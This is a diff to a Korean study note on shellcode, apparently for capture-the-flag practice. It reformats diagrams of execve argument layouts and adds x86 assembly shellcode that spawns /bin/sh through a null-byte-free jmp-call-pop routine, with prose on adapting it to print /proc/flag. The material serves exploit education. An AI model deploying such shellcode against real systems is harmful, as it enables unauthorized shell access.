@@ -27,30 +27,68 @@ Shellcode란 기본적으로 시스템 해킹, [exploitation(취약점 공격)](
 STRING을 코드 2와 같이 고치면 어떻게 될까? 다른 부분도 고쳐야 하기는 하지만, 결론을 말하면 `/bin/sh`를 실행하던 코드가 `/bin/cat`을 실행하고, 그 `/bin/cat`의 argument로 `/proc/flag`를 넘겨줘서 flag가 출력되게 된다. 
 
 - 코드 1의 개요도
-```
- +-------------+
- v             |
- [/bin/cat][0][ptr ][NULL]
-               ^     ^     
-               |     +-- envp
-               +-- argv
+    ```
+    +-------------+
+    v             |
+    [/bin/cat][0][ptr ][NULL]
+                ^     ^     
+                |     +-- envp
+                +-- argv
 
-```
+    ```
 
 - 코드 2의 개요도
-```
- +----------------------------+
- |             +--------------=-----+
- v             v              |     |
- [/bin/cat][0][/proc/flag][0][ptr1][ptr2][NULL]
-                              ^           ^
-                              |           +-- envp
-                              +-- argv
+    ```
+    +----------------------------+
+    |             +--------------=-----+
+    v             v              |     |
+    [/bin/cat][0][/proc/flag][0][ptr1][ptr2][NULL]
+                                ^           ^
+                                |           +-- envp
+                                +-- argv
 
-```
+    ```
 
 - 코드 1
     ```
+    #include <sys/syscall.h>
+
+    #define STRING  "/bin/sh"
+    #define STRLEN  7
+    #define ARGV    (STRLEN+1)
+    #define ENVP    (ARGV+4)
+
+    .intel_syntax noprefix
+    .text
+
+    .globl main
+    .type  main, @function
+
+    main:
+    jmp     calladdr
+
+    popladdr:
+    pop    esi                    /* esi points to STRING */
+    mov    [ARGV+esi],esi         /* set up argv[0] pointer to pathname */
+    xor    eax,eax                /* get a 32-bit zero value */
+    mov    [STRLEN + esi],al      /* null-terminate our string */
+    mov    [ENVP + esi], eax      /* set up null envp */
+
+    mov    al,SYS_execve          /* syscall number */
+    mov    ebx,esi                /* arg 1: string pathname */
+    lea    ecx,[ARGV + esi]       /* arg 2: argv */
+    lea    edx,[ENVP + esi]       /* arg 3: envp */
+    int    0x80                   /* execve("/bin/sh", ["/bin/sh", NULL], [NULL]) */
+
+    xor    ebx,ebx                /* arg 1: 0 */
+    mov    eax,ebx
+    inc    eax                    /* exit(0) */
+    /* mov+inc to avoid null byte */
+    int    0x80                   /* invoke syscall */
+
+    calladdr:
+    call    popladdr
+    .string STRING
 
     ```
 
